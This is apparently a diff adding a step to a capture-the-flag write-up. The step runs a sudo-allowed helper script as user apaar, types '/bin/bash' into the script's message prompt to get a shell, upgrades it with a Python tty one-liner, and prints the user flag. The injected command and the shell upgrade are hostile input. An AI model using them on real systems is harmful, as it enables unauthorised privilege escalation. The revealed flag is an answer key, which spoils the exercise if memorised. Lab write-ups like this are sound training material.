@@ -295,3 +295,22 @@ User www-data may run the following commands on ubuntu:
     (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
 ```
 
+```text
+sudo -u apaar /home/apaar/.helpline.sh
+```
+
+```text
+Welcome to helpdesk. Feel free to talk to anyone at any time!
+
+Enter the person whom you want to talk with: asdf
+Hello user! I am asdf,  Please enter your message: /bin/bash 
+python3 -c 'import tty; tty.spawn("/bin/bash")'
+
+pwd
+/home/apaar
+cat local.txt
+{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
+```
+
+
+
